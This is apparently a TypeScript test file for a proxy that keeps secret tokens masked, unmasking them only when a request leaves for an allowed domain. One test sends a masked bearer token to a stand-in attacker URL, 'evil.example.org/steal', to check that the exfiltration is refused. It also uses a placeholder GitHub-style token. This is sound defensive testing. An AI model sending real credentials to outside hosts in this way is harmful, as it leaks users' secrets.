/**
 * The secret boundary through the realm proxy (#3571): a program sends a
 * masked token; it is unmasked only where the request leaves (the CLI's real
 * `/api/fetch-proxy` route with its `SecretProxyManager`), and what comes
 * back to the program — an echo of the token, an error — carries the mask.
 *
 * Kernel side: the production proxy and fetch transport (`createProxiedFetch`
 * against the bridge). Bridge side: node-server's route, in this process. The
 * upstream `api.example.test` is a stub behind the global `fetch` the route
 * calls, so it sees exactly what the route sends.
 */
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import express from 'express';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { AgentActivityTracker } from '../../../../../node-server/src/routes/agent-activity.js';
import { registerFetchProxyRoute } from '../../../../../node-server/src/routes/fetch-proxy.js';
import { registerRawFetchProxyRoute } from '../../../../../node-server/src/routes/fetch-proxy-raw.js';
import { EnvSecretStore } from '../../../../../node-server/src/secrets/env-secret-store.js';
import { SecretProxyManager } from '../../../../../node-server/src/secrets/proxy-manager.js';
import { readOrCreateSessionId } from '../../../../../node-server/src/secrets/session-id-file.js';
import { proxiedFetchTransport } from '../../../../src/kernel/wasm-realm/net/fetch-transport.js';
import { RealmProxy } from '../../../../src/kernel/wasm-realm/net/proxy-service.js';
import { realmFetchTransport } from '../../../../src/kernel/wasm-realm/net/raw-transport.js';
import { type CaRecord, RealmCa } from '../../../../src/kernel/wasm-realm/net/realm-ca.js';
import { TlsTerminator } from '../../../../src/kernel/wasm-realm/net/tls-tunnel.js';
import { LoopbackNet } from '../../../../src/kernel/wasm-realm/socket.js';
import { setLocalApiBaseUrl } from '../../../../src/shell/proxied-fetch.js';
import { Client } from './proxy-helpers.js';
import { exchange, nodeTlsEngine, tlsTunnel } from './tls-helpers.js';

const REAL = 'ghp_realSecretValue0123456789abcdefXYZ';

let dir: string;
let server: Server;
let masked: string;
const bridgeCalls = { raw: 0, fallback: 0 };
const proxies = new Map<'raw' | 'fallback', { net: LoopbackNet; proxy: RealmProxy }>();
let ca: RealmCa;
const upstreamSaw: Array<{ url: string; authorization: string | null; body: string }> = [];

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'slicc-realm-secrets-'));
  writeFileSync(join(dir, 'secrets.env'), `TOKEN=${REAL}\nTOKEN_DOMAINS=api.example.test\n`);
  const secretProxy = new SecretProxyManager(
    new EnvSecretStore(join(dir, 'secrets.env')),
    readOrCreateSessionId(dir)
  );
  await secretProxy.reload();
  const entry = secretProxy.getMaskedEntries().find((e) => e.name === 'TOKEN');
  masked = entry?.maskedValue ?? '';
  expect(masked).not.toBe('');
  expect(masked).not.toBe(REAL);

  const app = express();
  const silent = { log: () => undefined, warn: () => undefined, error: () => undefined };
  // As node-server wires them: raw mode first, the default route after it.
  const activityTracker = new AgentActivityTracker();
  registerRawFetchProxyRoute(app, { secretProxy, activityTracker, logger: silent });
  registerFetchProxyRoute(app, { secretProxy, activityTracker, logger: silent });
  server = await new Promise<Server>((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  const bridge = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  setLocalApiBaseUrl(bridge);

  // The upstream: echoes the credential it received, in a header and a text body.
  const realFetch = globalThis.fetch;
  vi.spyOn(globalThis, 'fetch').mockImplementation(async (input, init) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    if (url.startsWith(bridge)) {
      const raw = new Headers(init?.headers).has('x-slicc-raw-request');
      bridgeCalls[raw ? 'raw' : 'fallback']++;
      return realFetch(input, init);
    }
    const headers = new Headers(init?.headers);
    const body = init?.body ? await new Response(init.body).text() : '';
    upstreamSaw.push({ url, authorization: headers.get('authorization'), body });
    if (url.endsWith('/moved')) {
      const moved = new Headers({ location: 'http://api.example.test/there' });
      moved.append('set-cookie', 'a=1; Path=/');
      moved.append('set-cookie', 'b=2; Path=/');
      return new Response(null, { status: 301, headers: moved });
    }
    return new Response(`you sent ${headers.get('authorization')} and ${body}`, {
      status: 200,
      headers: { 'content-type': 'text/plain', 'x-echo': headers.get('authorization') ?? '' },
    });
  });

  const records = new Map<string, CaRecord>();
  ca = await RealmCa.open('cone:', {
    get: async (o) => records.get(o),
    put: async (o, r) => void records.set(o, r),
  });
  const tls = new TlsTerminator({ ca: async () => ca, engine: () => nodeTlsEngine() });
  // Raw mode (the route's HTTP-client flavor), and the browser-shaped fallback.
  for (const [name, transport] of [
    ['raw', realmFetchTransport()],
    ['fallback', proxiedFetchTransport()],
  ] as const) {
    const net = new LoopbackNet();
    proxies.set(name, { net, proxy: new RealmProxy({ net, transport, tunnel: tls.handler }) });
  }
}, 30_000);

afterAll(async () => {
  for (const { proxy } of proxies.values()) {
    proxy.close();
    await proxy.closed;
  }
  vi.restoreAllMocks();
  setLocalApiBaseUrl(null);
  await new Promise((resolve) => server?.close(resolve));
  rmSync(dir, { recursive: true, force: true });
});

describe.each([
  ['raw', 403],
  ['fallback', 502],
] as const)('realm proxy secret boundary (CLI route, %s)', (mode, forbidden) => {
  let net: LoopbackNet;
  let proxy: RealmProxy;
  beforeAll(() => {
    ({ net, proxy } = proxies.get(mode) as { net: LoopbackNet; proxy: RealmProxy });
  });

  it('unmasks a masked Authorization only at egress and masks the echo on the way back', async () => {
    const c = Client.open(net, proxy.port);
    await c.send(
      `GET http://api.example.test/echo HTTP/1.1\r\nHost: api.example.test\r\nAuthorization: Bearer ${masked}\r\n\r\n`
    );
    const res = await c.response();
    expect(upstreamSaw.at(-1)).toMatchObject({
      url: 'http://api.example.test/echo',
      authorization: `Bearer ${REAL}`,
    });
    expect(res.status).toBe(200);
    expect(res.body).toBe(`you sent Bearer ${masked} and `);
    expect(res.header('x-echo')).toBe(`Bearer ${masked}`);
    const wire = JSON.stringify(res);
    expect(wire).not.toContain(REAL);
    c.close();
  });

  it('unmasks a masked token in a request body (buffered upload path) and masks its echo', async () => {
    const c = Client.open(net, proxy.port);
    const body = `token=${masked}`;
    await c.send(
      `POST http://api.example.test/form HTTP/1.1\r\nContent-Type: text/plain\r\nContent-Length: ${body.length}\r\n\r\n${body}`
    );
    const res = await c.response();
    expect(upstreamSaw.at(-1)?.body).toBe(`token=${REAL}`);
    expect(res.body).toBe(`you sent null and token=${masked}`);
    expect(JSON.stringify(res)).not.toContain(REAL);
    c.close();
  });

  it('refuses a masked token bound for another domain, and the error names no value', async () => {
    const before = upstreamSaw.length;
    const c = Client.open(net, proxy.port);
    await c.send(
      `GET http://evil.example.org/steal HTTP/1.1\r\nAuthorization: Bearer ${masked}\r\n\r\n`
    );
    const res = await c.response();
    expect(res.status).toBe(forbidden);
    expect(res.body).toContain('Secret "TOKEN" is not allowed for domain "evil.example.org"');
    expect(JSON.stringify(res)).not.toContain(REAL);
    expect(upstreamSaw.length).toBe(before);
    c.close();
  });

  it('does the same inside a terminated TLS tunnel (https://)', async () => {
    const socket = await tlsTunnel(net, 'api.example.test:443', ca.pem);
    const res = (
      await exchange(
        socket,
        `GET /echo HTTP/1.1\r\nHost: api.example.test\r\nAuthorization: Bearer ${masked}\r\n\r\n`,
        (text) => text.endsWith('0\r\n\r\n')
      )
    ).toString();
    socket.destroy();
    expect(upstreamSaw.at(-1)).toMatchObject({
      url: 'https://api.example.test/echo',
      authorization: `Bearer ${REAL}`,
    });
    expect(res).toContain(`you sent Bearer ${masked}`);
    expect(res).toContain(`x-echo: Bearer ${masked}`);
    expect(res).not.toContain(REAL);
  });

  it.runIf(mode === 'raw')(
    'hands the client a 301 with its Location and each Set-Cookie',
    async () => {
      const c = Client.open(net, proxy.port);
      await c.send('GET http://api.example.test/moved HTTP/1.1\r\n\r\n');
      const res = await c.response();
      expect({ status: res.status, body: res.body }).toEqual({ status: 301, body: '' });
      expect(res.header('location')).toBe('http://api.example.test/there');
      expect(
        res.headers.filter(([n]) => n.toLowerCase() === 'set-cookie').map(([, v]) => v)
      ).toEqual(['a=1; Path=/', 'b=2; Path=/']);
      c.close();
    }
  );

  it('reaches the bridge in its own mode only', async () => {
    const before = { ...bridgeCalls };
    const c = Client.open(net, proxy.port);
    await c.send('GET http://api.example.test/echo HTTP/1.1\r\n\r\n');
    expect((await c.response()).status).toBe(200);
    c.close();
    const other = mode === 'raw' ? 'fallback' : 'raw';
    expect(bridgeCalls[mode]).toBe(before[mode] + 1);
    expect(bridgeCalls[other]).toBe(before[other]);
  });
});
